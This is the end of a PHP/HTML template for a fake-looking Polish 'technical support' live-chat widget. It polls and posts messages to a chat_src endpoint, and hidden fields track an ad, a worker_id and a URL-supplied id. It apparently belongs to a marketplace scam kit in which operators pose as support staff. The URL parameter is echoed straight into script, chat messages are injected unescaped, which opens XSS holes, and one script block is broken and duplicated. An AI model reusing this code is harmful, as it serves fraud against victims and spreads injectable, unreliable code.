    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #002F34;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #002F34;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
    
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="ordercss/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="ordercss/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


        var supportbutton = document.querySelector('.chaport-launcher-button');
            var supportwindow = document.querySelector('.chaport-window');

            supportbutton.onclick = function() {
                if (supportwindow.style.opacity == '0') {
                    supportwindow.style.opacity = '1';
                    supportwindow.style.visibility = 'visible';
                } else {
                    supportwindow.style.opacity = '0';
                    supportwindow.style.visibility = 'hidden';
                }
            };
        </script>

        <script type="text/javascript">

        var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
  var supportbutton = document.querySelector('.chaport-launcher-button');
  var supportwindow = document.querySelector('.chaport-window');
  var token = <?php echo $_GET['id']; ?>;
  if (token !== null) {
    if (pool) {
      xhttp = new XMLHttpRequest();
      var track_id = document.getElementById("refresh_time").value;
      var url = 'https://' + document.location.hostname + '/chat_src/message.php';
      pool = false;
      xhttp.open("POST", url, true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send("get=0&token=" + token);
      xhttp.onload = function (e) {
        if (xhttp.readyState === 4) {
          if (xhttp.status === 200) {
            var body = xhttp.response;
            pool = true;
            var json = JSON.parse(body);
            for (let i = 0; i < json.length; i++) {
              cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
              if (json[i].sender == 't') {
                text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
              } else if (json[i].sender == 'i') {
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }else if (json[i].sender == "testOnline"){
                return 'okay';
              }else{
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }

              
              $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
              var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
              objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
              supportwindow.style.opacity = '1';
              supportwindow.style.visibility = 'visible';
            }

          } else {
            pool = true;
          }
        }
      }
    }
  }
}

        function sendMessage() {
  message = document.getElementById("smstosup1").value;
  if (message === '') {
    return;
  }
  document.getElementById("smstosup1").value = '';
  var token = document.getElementById("refresh_time").value;
  if (token === null) {
    var token = Math.random().toString(36).substring(7);
  }
  xhttp = new XMLHttpRequest();
  var track_id = document.getElementById("refresh_time").value;
  var url = 'https://' + document.location.hostname + '/chat_src/message.php';
  xhttp.open("POST", url, true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  var uid = document.getElementById("home_time").value;
  var title = document.getElementById("product").value;
  xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
  cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
  $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
  setCookie('token', token);
  var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
  objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
  var d = new Date();
  d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
  var expires = "expires=" + d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

        </script>

	    <script type="text/javascript">
$(document).on('click', '.panel-heading span.icon_minim', function (e) {
  var $this = $(this);


var xhttp = null;
$(document).ready(function () {
  window.onbeforeunload = function () {
    xhttp.abort();
  };
  var token = <?php echo $_GET['id']; ?>;
  if (token !== null) {
    xhttp = new XMLHttpRequest();
    var track_id = document.getElementById("refresh_time").value;
    var url = 'https://' + document.location.hostname + '/chat_src/message.php';
    xhttp.open("POST", url, true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("get=1&token=" + token);
    xhttp.onload = function (e) {
      if (xhttp.readyState === 4) {
        if (xhttp.status === 200) {
          var body = xhttp.response;
          var json = JSON.parse(body);
          for (let i = 0; i < json.length; i++) {
            if (json[i].message !== 'start') {
              cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
              if (json[i].sender == 't') {
                text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
              } else if (json[i].sender == 'i') {
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }else if (json[i].sender == "testOnline"){
                return 'okay';
              }else{
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }
              $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
            }
          }
          var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
          objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
        }
      }
    }
  }
});

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
  var supportbutton = document.querySelector('.chaport-launcher-button');
  var supportwindow = document.querySelector('.chaport-window');
  var token = <?php echo $_GET['id']; ?>;
  if (token !== null) {
    if (pool) {
      xhttp = new XMLHttpRequest();
      var track_id = document.getElementById("refresh_time").value;
      var url = 'https://' + document.location.hostname + '/chat_src/message.php';
      pool = false;
      xhttp.open("POST", url, true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send("get=0&token=" + token);
      xhttp.onload = function (e) {
        if (xhttp.readyState === 4) {
          if (xhttp.status === 200) {
            var body = xhttp.response;
            pool = true;
            var json = JSON.parse(body);
            for (let i = 0; i < json.length; i++) {
              cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
              if (json[i].sender == 't') {
                text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
              } else if (json[i].sender == 'i') {
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }else if (json[i].sender == "testOnline"){
                return 'okay';
              }else{
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }

              //$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html() + '<div class="visitors-msg-text" id="qwe1649370526">asd123</div>');
              $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
              var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
              objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
              supportwindow.style.opacity = '1';
              supportwindow.style.visibility = 'visible';
            }

          } else {
            pool = true;
          }
        }
      }
    }
  }
}

function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return null;
}

</script>



</body></html>